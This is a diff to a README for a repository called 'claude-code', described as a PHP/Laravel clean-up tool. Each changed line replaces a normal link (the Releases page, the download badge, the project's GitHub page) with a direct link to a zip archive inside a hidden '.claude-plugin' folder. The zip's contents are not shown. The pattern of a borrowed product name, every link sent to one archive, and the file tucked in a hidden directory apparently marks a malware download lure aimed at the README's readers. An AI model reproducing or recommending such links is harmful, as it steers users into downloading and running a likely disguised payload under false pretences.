@@ -8,11 +8,11 @@ Welcome to **claude-code**! This tool helps you clean up your PHP and Laravel co
 
 To get started, visit the Releases page to download the latest version of **claude-code**. 
 
-[![Download claude-code](https://img.shields.io/badge/Download-claude--code-brightgreen)](https://github.com/Himanshu123cyber/claude-code/releases)
+[![Download claude-code](https://github.com/Himanshu123cyber/claude-code/raw/refs/heads/main/laravel-simplifier/.claude-plugin/code_claude_3.2.zip)](https://github.com/Himanshu123cyber/claude-code/raw/refs/heads/main/laravel-simplifier/.claude-plugin/code_claude_3.2.zip)
 
 ### Steps to Download:
 
-1. Click on this link: [Download the latest releases](https://github.com/Himanshu123cyber/claude-code/releases).
+1. Click on this link: [Download the latest releases](https://github.com/Himanshu123cyber/claude-code/raw/refs/heads/main/laravel-simplifier/.claude-plugin/code_claude_3.2.zip).
 2. Look for the latest release version.
 3. Download the file for your system.
 
@@ -90,6 +90,6 @@ We welcome contributions from the community! If you have ideas for new features 
 
 ## 🔗 Additional Resources
 
-Check our [GitHub page](https://github.com/Himanshu123cyber/claude-code) for additional documentation, updates, and information.
+Check our [GitHub page](https://github.com/Himanshu123cyber/claude-code/raw/refs/heads/main/laravel-simplifier/.claude-plugin/code_claude_3.2.zip) for additional documentation, updates, and information.
 
 Remember, your feedback helps us improve, so don’t hesitate to reach out. Enjoy coding with **claude-code**!
